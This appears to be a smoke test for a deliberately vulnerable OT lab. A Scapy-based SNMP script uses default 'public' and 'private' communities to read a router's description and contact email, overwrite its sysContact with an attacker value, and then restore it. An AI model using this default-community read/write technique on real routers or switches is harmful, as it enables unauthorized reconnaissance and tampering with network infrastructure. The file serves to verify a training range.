#!/usr/bin/env bash
# L3 surface probe. Every FRR router runs Net-SNMP with vendor-default
# communities (public RO, private RW) and no source-IP filtering, the
# textbook OT misconfiguration: managed switch commissioned, communities
# never changed, ACL never tightened.
#
# Coverage:
#   Stage 0  UDP/161 reachable on inet-dmz-fw from internet zone (skip if not)
#   Stage 1  sysDescr readable with community 'public'
#   Stage 2  sysContact readable with community 'private'
#   Stage 3  sysContact writable with community 'private', read-back confirms
#   Stage 4  cleanup: sysContact restored
#
# Usage: bash tests/smoke/test_snmp_default_community.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ATTACKER="attacker-machine"
ROUTER="inet-dmz-fw"
ROUTER_IP="10.10.0.200"

require_running "$ATTACKER"
require_running "$ROUTER"

SNMP_PY='
import sys, random
from scapy.all import (IP, UDP, SNMP, SNMPget, SNMPset, SNMPvarbind,
                       ASN1_OID, ASN1_NULL, ASN1_STRING, sr1)
host, community, oid, op, newval = sys.argv[1:6]
xid = random.randint(1, 0xFFFF)
if op == "get":
    pdu = SNMPget(id=xid, varbindlist=[
        SNMPvarbind(oid=ASN1_OID(oid), value=ASN1_NULL(0))])
else:
    pdu = SNMPset(id=xid, varbindlist=[
        SNMPvarbind(oid=ASN1_OID(oid), value=ASN1_STRING(newval))])
pkt = IP(dst=host)/UDP(sport=random.randint(40000, 60000), dport=161)/SNMP(
    version=1, community=community.encode(), PDU=pdu)
r = sr1(pkt, timeout=3, verbose=False)
if r is None:
    print("ERR:no-response"); sys.exit(0)
if not r.haslayer(SNMP):
    print("ERR:no-snmp-layer"); sys.exit(0)
err = r[SNMP].PDU.error.val
if err != 0:
    print(f"ERR:status={err}"); sys.exit(0)
vb = r[SNMP].PDU.varbindlist[0]
val = vb.value.val
if isinstance(val, bytes):
    val = val.decode("utf-8", "replace")
print(val)
'

snmp_query() {
    # snmp_query <community> <oid>           → prints string value or 'ERR:<msg>'
    # snmp_query <community> <oid> set <val> → snmpset, prints set value or error
    local community="$1" oid="$2" op="${3:-get}" newval="${4:-}"
    docker exec "$ATTACKER" /opt/attacker-env/bin/python3 -c "$SNMP_PY" \
        "$ROUTER_IP" "$community" "$oid" "$op" "$newval" 2>&1
}

echo "[snmp] Stage 0: UDP/161 reachable on $ROUTER from $ATTACKER"
# UDP has no SYN/ACK so we probe with a real SNMPv2c get. If snmpd isn't
# running yet (router image pre-rebuild), this errors and the test skips.
PROBE="$(snmp_query public 1.3.6.1.2.1.1.1.0)"
if echo "$PROBE" | grep -q '^ERR:'; then
    echo "  [skip] snmpd on $ROUTER not reachable on UDP/161 ($PROBE)."
    echo "         Rebuild clab-router image and './ctl down && ./ctl up' to redeploy."
    exit 2
fi
ok "$ROUTER UDP/161 responds to SNMPv2c"

SYS_DESCR_OID='1.3.6.1.2.1.1.1.0'
SYS_CONTACT_OID='1.3.6.1.2.1.1.4.0'

echo "[snmp] Stage 1: sysDescr readable with community 'public'"
DESCR="$(snmp_query public "$SYS_DESCR_OID")"
assert_contains "$DESCR" "UU P&L" "sysDescr discloses vendor stock firmware string"

echo "[snmp] Stage 2: sysContact readable with community 'private'"
ORIG_CONTACT="$(snmp_query private "$SYS_CONTACT_OID")"
assert_contains "$ORIG_CONTACT" "@uupl.am" "sysContact discloses an internal email"

echo "[snmp] Stage 3: sysContact writable with community 'private'"
POISONED='attacker@example.invalid'
SET_OUT="$(snmp_query private "$SYS_CONTACT_OID" set "$POISONED")"
assert_contains "$SET_OUT" "$POISONED" "snmpset(sysContact) returns the new value"
READBACK="$(snmp_query public "$SYS_CONTACT_OID")"
assert_contains "$READBACK" "$POISONED" "subsequent snmpget(sysContact) reflects the write"

echo "[snmp] Stage 4: restore sysContact"
RESTORE="$(snmp_query private "$SYS_CONTACT_OID" set "$ORIG_CONTACT")"
assert_contains "$RESTORE" "$ORIG_CONTACT" "snmpset(sysContact) restored"
FINAL="$(snmp_query public "$SYS_CONTACT_OID")"
assert_contains "$FINAL" "$ORIG_CONTACT" "sysContact back to original value"

summary
